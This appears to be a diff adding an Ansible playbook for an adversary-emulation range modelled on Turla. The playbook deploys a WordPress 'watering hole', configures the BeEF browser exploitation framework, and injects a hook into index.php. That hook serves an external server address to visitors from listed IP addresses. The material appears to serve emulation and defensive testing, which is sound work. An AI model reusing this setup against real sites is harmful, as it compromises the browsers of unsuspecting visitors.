@@ -1,0 +1,67 @@
+---
+
+- name: Copy Watering Hole 
+  become: yes
+  become_method: sudo
+  ansible.builtin.copy:
+    src: "files/turla/Resources/setup/files/watering_hole"
+    dest: "/opt"
+    mode: u=rx,g=rx,o=r
+    force: no
+
+- name: Setup Word Press 
+  become: yes
+  become_method: sudo
+  command: /bin/bash wordpress_setup.sh
+  args:
+    chdir: /opt/watering_hole/
+
+- name: Run Fingerprint.py and install required packages
+  become: yes
+  become_method: sudo
+  expect:
+    command: python3 fingerprinting.py 
+    responses:
+      'replace beef-master/\.bundle/config.*:': "A" 
+    chdir: /opt/watering_hole/
+    echo: yes
+
+- name: Edit username in beef-master/config.yaml 
+  ansible.builtin.lineinfile:
+    path: /opt/watering_hole/beef-master/config.yaml 
+    regexp: '^        user:\s*"beef"'
+    line: '        user: "mitre"'
+
+- name: Edit password in beef-master/config.yaml 
+  ansible.builtin.lineinfile:
+    path: /opt/watering_hole/beef-master/config.yaml 
+    regexp: '^        passwd:\s*"beef"'
+    line: '        passwd: "mitre"'
+
+- name: Edit beef hook in beef-master/config.yaml 
+  ansible.builtin.lineinfile:
+    path: /opt/watering_hole/beef-master/config.yaml 
+    regexp: '^        hook_session_name:\s*"BEEFHOOK"'
+    line: '        hook_session_name: "MITREHOOK"'
+
+- name: Replace Local Host address with Server address
+  ansible.builtin.replace:
+    path: /opt/watering_hole/in-range.html
+    regexp: '127\.0\.0\.1\:3000'
+    replace: '176.59.15.44:3000'
+
+- name: Run ip_range.py 
+  become: yes
+  become_method: sudo
+  command: /usr/bin/python3 ip_range.py /srv/www/wordpress/index.php 10.20.20.102 10.20.20.103 10.20.20.104 -i in-range.html 
+  args:
+    chdir: /opt/watering_hole/
+
+#- name: Move Redirect Java Script
+#  become: yes
+#  become_method: sudo
+#  ansible.builtin.copy:
+#    src: /opt/watering_hole/counter.js 
+#    dest: /srv/www/wordpress/counter.js 
+#    remote_src: yes
+
